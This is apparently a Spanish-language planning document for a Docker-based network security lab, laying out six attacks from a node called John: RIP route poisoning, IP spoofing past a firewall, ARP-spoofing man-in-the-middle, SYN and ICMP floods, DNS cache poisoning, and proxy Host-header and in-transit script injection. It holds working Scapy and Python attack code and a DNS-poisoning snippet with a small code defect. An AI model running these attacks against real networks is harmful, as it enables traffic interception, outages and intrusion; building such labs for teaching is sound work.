# Análisis de ataques desde John

John vive en **network2** (192.168.2.2), con router_b como único vecino directo (192.168.2.1).
Todos los routers hablan **RIP** sin autenticación. El DNS configurado en John apunta a 192.168.3.2.

---

## Mapa de topología

```
[alice 192.168.1.2]  [bob 192.168.1.3]
        |                   |
    [ router_a 192.168.1.1 / 192.168.5.1 ]
                |  (network5)
    [ router_e 192.168.5.2 / 192.168.5.65 / 192.168.5.97 ]
          |  (network7)         |  (network8)
    [ router_d ]           [ router_b 192.168.2.1 / 192.168.5.33 / 192.168.5.98 ]
    192.168.4.1 / 5.66 / 5.129   |  (network6)        |
          |  (network9)      [ router_c 192.168.5.34 / 192.168.5.130 / 192.168.3.1 ]
    [ router_c ]                  |
          |                  [dns 192.168.3.2]  [vpn 192.168.3.3]
          |
    [ firewall_extern 192.168.4.2 / 4.65 ]
          |  (DMZ)
    [ proxy 192.168.4.66 ] [ firewall_intern 192.168.4.67/4.129 ]
                                  |  (internal)
                     [http .130] [mysql .131] [syslog .132]

[john 192.168.2.2] ──── router_b ──── backbone
```

---

## Ataque 1 — Routing Tables Poisoning

### Objetivo
Inyectar rutas falsas en los routers vía RIP para redirigir tráfico de toda la red a través de John.

### Red objetivo
**Backbone RIP** — network6 (192.168.5.32/27) y network8 (192.168.5.96/27), las dos redes donde router_b tiene interfaces. John puede emitir paquetes RIP directamente a router_b, que los propagará al resto.

### Por qué tiene coherencia
RIP v1/v2 sin autenticación acepta actualizaciones de cualquier vecino. John comparte L2 con router_b en network2 y puede enviar paquetes RIP Response anunciando que conoce rutas con métrica 1 hacia cualquier destino (incluso 0.0.0.0/0 como ruta por defecto), desplazando las rutas legítimas.

### Herramienta
**Scapy** (ya disponible vía python3, solo añadir `py3-scapy` al Dockerfile.node).

### Implementación
```python
# Scapy - enviar RIP Response falso a router_b
from scapy.all import *
from scapy.contrib.rip import *

pkt = (
    IP(src="192.168.2.2", dst="192.168.2.1") /
    UDP(sport=520, dport=520) /
    RIP(cmd=2, version=2) /
    RIPEntry(AF=2, addr="0.0.0.0", mask="0.0.0.0", metric=1)  # default route via john
)
send(pkt, iface="eth0")
```

### Efecto observable
- `ip route show` en router_b muestra 0.0.0.0/0 via 192.168.2.2
- Todo el tráfico inter-red atraviesa John
- Precondición para el ataque MitM del punto 3 sin necesidad de ARP

---

## Ataque 2 — IP Spoofing

### Objetivo
Enviar paquetes con IP origen falsificada para suplantar a otro nodo y eludir reglas de firewall.

### Red objetivo
**network4_int** — el firewall_intern solo permite que 192.168.4.66 (proxy) acceda a http (puerto 80) y mysql (puerto 3306). Si John spoofea esa IP, puede alcanzar esos servicios directamente.

### Por qué tiene coherencia
El firewall_intern filtra por IP origen sin verificar autenticidad del paquete. John puede construir un paquete TCP SYN con `src=192.168.4.66` y enviarlo hacia 192.168.4.130:80 o 192.168.4.131:3306. Como el firewall solo mira la cabecera IP, lo deja pasar.

Nota: el tráfico de retorno irá a 192.168.4.66 (proxy real), no a John. El ataque es útil para bypass de reglas o para triggers ciegos (blind injection), no para conexiones interactivas completas.

### Herramienta
**Scapy**

### Implementación
```python
from scapy.all import *

# Spoof como proxy hacia http server
pkt = (
    IP(src="192.168.4.66", dst="192.168.4.130") /
    TCP(sport=RandShort(), dport=80, flags="S")
)
send(pkt)
```

### Efecto observable
- El http server responde SYN-ACK hacia 192.168.4.66 (el proxy real)
- Los logs de syslog / firewall_intern muestran conexiones desde .66 que el proxy no inició
- Con RIP poisoning previo (ataque 1) se puede completar el circuito de retorno

---

## Ataque 3 — Man in the Middle + ARP Spoofing

### Objetivo
Posicionarse entre alice/bob y su gateway (router_a) para interceptar y leer/modificar su tráfico.

### Red objetivo
**network1** (192.168.1.0/24) — donde viven alice (192.168.1.2), bob (192.168.1.3) y router_a (192.168.1.1).

### Cambio de topología necesario
John actualmente solo tiene interfaz en network2. ARP spoofing requiere estar en el mismo segmento L2 que las víctimas. Hay que añadir a John una segunda interfaz en network1:

```yaml
# docker-compose.yml — sección john
networks:
  network2:
    ipv4_address: 192.168.2.2
  network1:                          # <-- añadir esto
    ipv4_address: 192.168.1.100
    driver_opts:
      com.docker.network.endpoint.sysctls: "net.ipv4.conf.IFNAME.arp_accept=1"
```

Y añadir en john-config.sh:
```sh
ip route add 192.168.1.0/24 dev eth1 scope link src 192.168.1.100
```

### Por qué tiene coherencia
Los nodos alice y bob tienen `arp_accept=1` expresamente configurado en el compose, lo que los hace aceptar ARP gratuitos sin validación. John envenena la caché ARP de alice y bob diciéndoles que la MAC de router_a (192.168.1.1) es la suya, y le dice a router_a que la MAC de alice/bob es la suya. Toda comunicación pasa por John.

### Herramienta
**Scapy** + activar ip_forward en John

### Implementación
```python
from scapy.all import *
import time

JOHN_MAC   = get_if_hwaddr("eth1")
GW_IP      = "192.168.1.1"
ALICE_IP   = "192.168.1.2"
BOB_IP     = "192.168.1.3"

def spoof(target_ip, spoof_ip):
    target_mac = getmacbyip(target_ip)
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac,
              psrc=spoof_ip, hwsrc=JOHN_MAC)
    send(pkt, verbose=False)

while True:
    spoof(ALICE_IP, GW_IP)   # alice cree que john es el gateway
    spoof(BOB_IP,   GW_IP)   # bob cree que john es el gateway
    spoof(GW_IP,    ALICE_IP) # router_a cree que john es alice
    spoof(GW_IP,    BOB_IP)   # router_a cree que john es bob
    time.sleep(1)
```

```sh
# En john-config.sh, activar forwarding para no cortar el tráfico
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Efecto observable
- `arp -n` en alice/bob muestra la MAC de John asociada a 192.168.1.1
- tcpdump en John ve el tráfico alice↔internet y bob↔internet en texto claro
- HTTP al proxy pasa a través de John y puede ser leído o modificado

---

## Ataque 4 — SYN Flood + ICMP Flood

### Objetivo
Saturar un servicio o nodo hasta dejarlo inoperativo (DoS).

### Red objetivo
**network4_dmz** — el proxy en 192.168.4.66 es el punto de entrada de todo el tráfico HTTP/HTTPS desde el exterior. Es el objetivo más realista porque:
- Es accesible desde John sin necesidad de bypassear firewall_intern
- Toda la arquitectura depende de él
- Segundo objetivo: DNS server (192.168.3.2) — si cae, toda la resolución de nombres falla

### Por qué tiene coherencia
El firewall_extern solo filtra por puerto, no limita el rate. nginx en el proxy no tiene `limit_req` configurado. El DNS (dnsmasq) tampoco tiene protección contra flood UDP.

### Herramienta
**Scapy** (SYN flood con IPs fuente aleatorias) + `ping` con `-f` para ICMP flood

### Implementación
```python
# SYN Flood al proxy
from scapy.all import *

target_ip  = "192.168.4.66"
target_port = 80

def syn_flood():
    while True:
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
        send(pkt, verbose=False)

syn_flood()
```

```sh
# ICMP Flood (requiere NET_RAW, ya presente en john)
ping -f 192.168.3.2          # DNS server
ping -f 192.168.4.66         # proxy
```

### Efecto observable
- El proxy deja de responder a peticiones legítimas
- `netstat -an` en el proxy muestra miles de conexiones en estado SYN_RECV
- El DNS server acumula pérdida de paquetes
- syslog registra el flood si el firewall tiene reglas de log

---

## Ataque 5 — DNS Cache Poisoning

### Objetivo
Envenenar la caché del servidor DNS (dnsmasq en 192.168.3.2) para que resuelva `WebDelLaboratorio.com` con la IP de John en lugar de 192.168.4.2.

### Red objetivo
**network3** (192.168.3.0/24) — donde está el servidor DNS.

### Por qué tiene coherencia
John usa 192.168.3.2 como nameserver (resolv.conf). Puede enviar consultas DNS y, al mismo tiempo, inyectar respuestas forjadas antes de que llegue la respuesta legítima. dnsmasq acepta la primera respuesta UDP con el Transaction ID correcto. El dominio `WebDelLaboratorio.com` es el único dominio del lab, lo que hace el ataque especialmente crítico.

### Herramienta
**Scapy** — sniff la query, extraer el Transaction ID, responder antes que el servidor real

### Implementación
```python
from scapy.all import *

DNS_SERVER = "192.168.3.2"
JOHN_IP    = "192.168.2.2"
TARGET_DOMAIN = "WebDelLaboratorio.com."

def poison_response(pkt):
    if (DNS in pkt and pkt[DNS].qr == 0 and         # es una query
        DNAME in str(pkt[DNS].qd.qname) or           # del dominio objetivo
        TARGET_DOMAIN.encode() in pkt[DNS].qd.qname):

        spoofed = (
            IP(src=DNS_SERVER, dst=pkt[IP].src) /
            UDP(sport=53, dport=pkt[UDP].sport) /
            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname,
                         ttl=300,
                         rdata=JOHN_IP))
        )
        send(spoofed, verbose=False)
        print(f"[+] Poisoned: {pkt[DNS].qd.qname} -> {JOHN_IP}")

sniff(filter="udp port 53", prn=poison_response, store=0)
```

### Efecto observable
- `nslookup WebDelLaboratorio.com 192.168.3.2` desde alice/bob devuelve IP de John
- Las peticiones HTTP de alice/bob hacia el sitio web llegan a John en lugar del proxy
- Si John levanta un servidor HTTP fake, puede servir contenido malicioso

---

## Ataque 6 — Proxy Traffic Injection

### Objetivo
Inyectar peticiones HTTP arbitrarias a través del proxy nginx para alcanzar servicios internos que normalmente están protegidos por firewall_intern.

### Red objetivo
**network4_dmz** / **network4_int** — el proxy (192.168.4.66) tiene acceso especial a http (192.168.4.130:80) y mysql (192.168.4.131:3306), inaccesibles desde fuera.

### Por qué tiene coherencia
nginx está configurado como reverse proxy sin `proxy_set_header` que limpie cabeceras. Es vulnerable a **HTTP Request Smuggling** (CL-TE o TE-CL) si el backend http también interpreta Transfer-Encoding. También es posible inyectar via **Host header manipulation** si nginx hace proxy_pass basado en el header Host.

Adicionalmente, si el MitM del ataque 3 está activo, John puede modificar las respuestas del proxy en tránsito, inyectando scripts en páginas HTML (XSS reflejo) o redireccionando a recursos maliciosos.

### Herramienta
**Python + socket raw** para HTTP smuggling / **Scapy** si el MitM está activo para modificar payloads en tránsito

### Implementación — Host Header Injection
```python
import socket

PROXY_IP   = "192.168.4.66"
PROXY_PORT = 80

payload = (
    "GET / HTTP/1.1\r\n"
    "Host: 192.168.4.130\r\n"       # apuntar directamente al http interno
    "X-Forwarded-For: 192.168.4.66\r\n"  # spoofear IP de proxy
    "Connection: close\r\n\r\n"
)

s = socket.create_connection((PROXY_IP, PROXY_PORT))
s.sendall(payload.encode())
print(s.recv(4096).decode())
s.close()
```

### Implementación — Inyección en tráfico MitM (si ataque 3 activo)
```python
# Con Scapy + NetfilterQueue o manipulación de paquetes en John
# John reescribe el body de las respuestas HTTP del proxy antes de reenviarlas a alice/bob
from scapy.all import *
from netfilterqueue import NetfilterQueue

def inject(pkt):
    payload = pkt.get_payload()
    if b"</body>" in payload:
        payload = payload.replace(b"</body>", b"<script>alert('XSS')</script></body>")
    pkt.set_payload(payload)
    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, inject)
nfqueue.run()
```

### Efecto observable
- Respuestas del servidor http llegan a John manipuladas antes de alcanzar alice/bob
- Acceso directo a recursos internos sin pasar por la lógica de autenticación del proxy
- Si MySQL es alcanzable vía host header manipulation, se pueden lanzar queries directas

---

## Resumen: qué hay que preparar

| Ataque | Herramienta principal | Cambio de topología | Cambio en Dockerfile.node |
|--------|-----------------------|---------------------|---------------------------|
| 1. RIP Poisoning | scapy (RIP contrib) | Ninguno | `py3-scapy` |
| 2. IP Spoofing | scapy | Ninguno | `py3-scapy` |
| 3. MitM + ARP | scapy | **Añadir john a network1** | `py3-scapy` + ip_forward en john-config.sh |
| 4. SYN/ICMP Flood | scapy + ping -f | Ninguno | `py3-scapy` |
| 5. DNS Poisoning | scapy | Ninguno | `py3-scapy` |
| 6. Proxy Injection | python socket / scapy+nfqueue | Ninguno (o MitM activo) | `py3-scapy`, `py3-pip` + netfilterqueue |

### Cambios globales necesarios

**Dockerfile.node** — añadir:
```dockerfile
RUN apk add --no-cache py3-scapy nmap
```

**docker-compose.yml** — añadir a john una segunda interfaz en network1 para el ataque 3:
```yaml
network1:
  ipv4_address: 192.168.1.100
  driver_opts:
    com.docker.network.endpoint.sysctls: "net.ipv4.conf.IFNAME.arp_accept=1"
```

**john-config.sh** — añadir ruta a network1 y activar forwarding:
```sh
ip route add 192.168.1.0/24 dev eth1 scope link src 192.168.1.100
echo 1 > /proc/sys/net/ipv4/ip_forward
```
